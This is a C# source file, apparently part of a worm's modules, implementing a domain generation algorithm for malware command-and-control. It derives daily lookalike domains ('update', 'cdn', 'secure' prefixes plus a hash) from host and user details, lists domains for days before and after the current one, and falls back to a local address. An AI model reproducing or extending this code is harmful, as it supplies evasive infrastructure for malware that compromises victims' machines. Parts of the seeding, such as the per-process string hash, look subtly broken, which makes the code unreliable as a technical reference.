using System;
using System.Security.Cryptography;
using System.Text;

namespace XYZ.modules.worm
{
    public class DGAServices
    {
        private const string FALLBACK_DOMAIN = "127.0.0.1:8000";
        private static readonly DateTime EPOCH = new DateTime(1970, 1, 1);
        
        public string GenerateDgaDomain(int dayOffset = 0)
        {
            try
            {
                // Calculate days since epoch
                DateTime currentDate = DateTime.UtcNow.AddDays(dayOffset);
                int daysSinceEpoch = (int)(currentDate - EPOCH).TotalDays;
                
                // Combine with seed
                string machineGuid = GetMachineGuid();
                int combinedSeed = Math.Abs(machineGuid.GetHashCode() + daysSinceEpoch);
                
                // Generate domain using improved algorithm
                string[] tlds = { "com", "net", "org", "info", "biz", "io", "co", "me" };
                string[] prefixes = { "update", "service", "system", "network", "data", "cloud", "secure", "api", "cdn", "storage", "backup" };
                
                // Use combined seed to select prefix and TLD
                string prefix = prefixes[combinedSeed % prefixes.Length];
                string tld = tlds[(combinedSeed / prefixes.Length) % tlds.Length];
                
                // Generate domain name with hash
                using (SHA256 sha256 = SHA256.Create())
                {
                    byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(combinedSeed.ToString()));
                    string hashString = BitConverter.ToString(hash).Replace("-", "").ToLower();
                    string domainPart = hashString.Substring(0, 12);
                    
                    return prefix + domainPart + "." + tld;
                }
            }
            catch
            {
                // Fallback to original domain
                return FALLBACK_DOMAIN;
            }
        }
        
        public string GenerateDgaDomainForDate(DateTime date)
        {
            try
            {
                // Calculate days since epoch for specific date
                int daysSinceEpoch = (int)(date.Date - EPOCH).TotalDays;
                
                // Get machine-specific seed
                string machineGuid = GetMachineGuid();
                int seed = Math.Abs(machineGuid.GetHashCode() + daysSinceEpoch);
                
                // Generate domain using improved algorithm
                string[] tlds = { "com", "net", "org", "info", "biz", "io", "co", "me" };
                string[] prefixes = { "update", "service", "system", "network", "data", "cloud", "secure", "api", "cdn", "storage", "backup" };
                
                // Use seed to select prefix and TLD
                string prefix = prefixes[seed % prefixes.Length];
                string tld = tlds[(seed / prefixes.Length) % tlds.Length];
                
                // Generate domain name with hash
                using (SHA256 sha256 = SHA256.Create())
                {
                    byte[] hash = sha256.ComputeHash(Encoding.UTF8.GetBytes(seed.ToString()));
                    string hashString = BitConverter.ToString(hash).Replace("-", "").ToLower();
                    string domainPart = hashString.Substring(0, 12);
                    
                    return prefix + domainPart + "." + tld;
                }
            }
            catch
            {
                // Fallback to original domain
                return FALLBACK_DOMAIN;
            }
        }
        
        public string[] GenerateDgaDomainList(int daysBack = 7, int daysForward = 7)
        {
            try
            {
                string[] domains = new string[daysBack + daysForward + 1];
                int index = 0;
                
                // Generate domains for past days
                for (int i = daysBack; i > 0; i--)
                {
                    domains[index++] = GenerateDgaDomain(-i);
                }
                
                // Generate domain for today
                domains[index++] = GenerateDgaDomain(0);
                
                // Generate domains for future days
                for (int i = 1; i <= daysForward; i++)
                {
                    domains[index++] = GenerateDgaDomain(i);
                }
                
                return domains;
            }
            catch
            {
                // Return fallback domain in case of error
                return new string[] { FALLBACK_DOMAIN };
            }
        }
        
        // Additional helper methods for real implementations
        
        private string GetMachineGuid()
        {
            try
            {
                // Get machine-specific identifier
                // In a real implementation, you might use:
                // - Machine GUID from registry
                // - MAC address
                // - CPU ID
                // - Hard drive serial number
                
                // For demonstration, we'll use a combination of environment variables
                string machineInfo = Environment.MachineName + Environment.UserName + Environment.OSVersion;
                return machineInfo;
            }
            catch
            {
                // Return a default value
                return "default-machine";
            }
        }
        
        public bool IsDgaDomain(string domain)
        {
            try
            {
                // Check if a domain is likely a DGA domain
                // In a real implementation, you would check against known DGA patterns
                
                // For demonstration, we'll check if it matches our pattern
                string[] prefixes = { "update", "service", "system", "network", "data", "cloud", "secure", "api", "cdn", "storage", "backup" };
                
                foreach (string prefix in prefixes)
                {
                    if (domain.StartsWith(prefix) && domain.Length > prefix.Length + 5)
                    {
                        return true;
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }
        
        public string GetCurrentDgaDomain()
        {
            try
            {
                // Get the current DGA domain for today
                return GenerateDgaDomain(0);
            }
            catch
            {
                return FALLBACK_DOMAIN;
            }
        }
        
        public string GetNextDgaDomain(int days = 1)
        {
            try
            {
                // Get the DGA domain for a future date
                return GenerateDgaDomain(days);
            }
            catch
            {
                return FALLBACK_DOMAIN;
            }
        }
        
        public string GetPreviousDgaDomain(int days = 1)
        {
            try
            {
                // Get the DGA domain for a past date
                return GenerateDgaDomain(-days);
            }
            catch
            {
                return FALLBACK_DOMAIN;
            }
        }
    }
}